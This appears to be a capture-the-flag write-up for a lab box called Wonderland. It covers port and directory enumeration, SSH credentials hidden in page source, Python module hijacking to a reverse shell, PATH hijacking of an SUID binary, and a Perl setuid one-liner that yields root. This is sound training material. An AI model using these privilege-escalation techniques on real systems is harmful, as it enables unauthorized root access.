![image](https://user-images.githubusercontent.com/99112106/181240563-b20eca88-3323-4d7d-81f4-739485a76810.png)

# Wonderland

## 1.Enumeration 

Let's start with a simple nmap scan:

``` 
nmap -sC -sV -p- 10.10.4.217     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-27 11:53 CEST
Nmap scan report for 10.10.4.217
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.75 seconds

```

We have opened ports like port 22 (ssh) and port 80 (http).

***
## 2. Exploring the website

If we take a look on the website we can see the following:

![image](https://user-images.githubusercontent.com/99112106/181240587-fb7e2443-af2a-4d47-9a6a-f46357a49e2c.png)


Let's run gobuster in order to enumerate hidden directories. This is what I found:

```
gobuster dir -u http://10.10.4.217 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.4.217
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/27 12:01:50 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/poem                 (Status: 301) [Size: 0] [--> poem/]
/r                    (Status: 301) [Size: 0] [--> r/]   
                                                         
===============================================================
2022/07/27 12:03:08 Finished
===============================================================
   
```

We have 3 directories "img", "poem" and "r". Of which, "poem" looks like a rabbit hole:

![image](https://user-images.githubusercontent.com/99112106/181240611-ae3a4083-d62d-40f1-abd6-4a4f167e4e98.png)

In the other hand, if we have a look into the "r" directory, it seems like it invites us to keep enumerating:

![image](https://user-images.githubusercontent.com/99112106/181240630-963d2a12-74e7-4259-a3cd-1b6a5628c0b0.png)

So I kept enumerating until i found this under "/r/a/b/b/i/t" directory:

![image](https://user-images.githubusercontent.com/99112106/181240645-e8bd21c0-ee40-4c34-871a-5bf5fdc00e22.png)

I took a moment to have a look the source code of that page and I found what it seemed like the ssh credentials for Alice!

![image](https://user-images.githubusercontent.com/99112106/181240661-87988755-32b8-4faa-aebc-fc00c2826795.png)

***
## 3. Foot Hold

After finding the SSH credentials for Alice I decided to went right into the SSH server:

![image](https://user-images.githubusercontent.com/99112106/181240677-39efe65f-ae9e-466c-8d92-caf172cd9684.png)

This is actually funny, we can red the user flag inside the root's directory xD In this box, as the hint suggests, everything is upside down, meaning root.txt is in users’ home, and user.txt is in /root.

![image](https://user-images.githubusercontent.com/99112106/181240700-934c1492-76ec-424b-a3f1-431e8c4c796e.png)

In Alice's home path I found the root flag (???) and a python script but, of course, I couldn't read the flag because I didn't have the rights as Alice:

![image](https://user-images.githubusercontent.com/99112106/181240721-a6cedbd9-3d58-468f-b621-b25c428efc29.png)

So I focused into the python script. Basically, It has a large poem from which It pseudo-randomly takes 10 lines:

![image](https://user-images.githubusercontent.com/99112106/181240746-89d91d34-0c46-475a-8d31-e5da4e66906c.png)

Adittionaly, I saw that Alice could run this Python script with root privs:

![image](https://user-images.githubusercontent.com/99112106/181240778-d6834964-0c18-421a-a04e-83d793355ee5.png)

Python will look in the current working directory first for the module files before searching the specified Python library directories; so with that in mind, I created a file called random.py in the same directory. I used the IronHackers Python reverse shell:

![image](https://user-images.githubusercontent.com/99112106/181240789-4fd12a91-d046-40b3-9a5f-d20f78fda817.png)

¡Important! Use the full path, otherwise it may throw an error about missing permissions.

![image](https://user-images.githubusercontent.com/99112106/181240804-60dd47d5-9c0c-4b60-a55e-2f4ab8c3ce45.png)

At this point I had managed to move laterally to another user:

![image](https://user-images.githubusercontent.com/99112106/181240823-48802abe-ea4c-4de4-b843-40b00c04b6a5.png)

As always, upgrade the shell:

![image](https://user-images.githubusercontent.com/99112106/181240848-6bceba3c-8f2c-4706-9d1b-8f32c295394a.png)

The user directory has an executable file named teaParty owned by root with SUID permissions, so it’s definitely worth further investigation:

![image](https://user-images.githubusercontent.com/99112106/181240880-b9088085-c343-443c-a2b7-f38fcd6767b1.png)

When I press the enter key, it immediately errors out with a “Segmentation fault” which sounds like an error with the memory:

![image](https://user-images.githubusercontent.com/99112106/181240903-82b07c64-39c2-4de0-8333-8ed05beac6fe.png)

Using the strings command I found this interesting:

![image](https://user-images.githubusercontent.com/99112106/181240927-58786576-1a9a-45cc-a231-36208910d085.png)

The key thing is that the date command is called with a specified path, that means that the shell will look through the $PATH variable for the file containing the data it wants to run. Knowing this, we can manipulate the path and have it point to our own crafted “date” command file instead of the original:

![image](https://user-images.githubusercontent.com/99112106/181240951-d12ed5a7-f211-4c68-b44a-06cc67e44750.png)

And we had managed to move laterally to "hatter"!!

On his working directory I found his password but unfortunately, he couldn't run sudo:

![image](https://user-images.githubusercontent.com/99112106/181240975-8f5d2bc7-c24e-4d0a-9a09-072bd79ca3d2.png)

At this point, I set up a Python HTTP server on my machine and downloaded and ran Linpeas on our target machine:

![image](https://user-images.githubusercontent.com/99112106/181240997-60aa9768-97d8-47cc-b115-261d1cffe236.png)

Found exploitable Perl capabilities with LinPEAS:

![image](https://user-images.githubusercontent.com/99112106/181241028-b1101118-e00d-4e88-9379-42a10599cbd2.png)

Since it’s a binary, let’s pull out our handy GTFObins page and give the provided commands a try:

![image](https://user-images.githubusercontent.com/99112106/181241038-57093442-8e18-4c44-9e6b-562dc8409392.png)

```
hatter@wonderland:/$ /usr/bin/perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
# whoami
root
# cd /home/alice
# cat root.txt
thm{thefinalflag}
```

And we're done! Congratz!
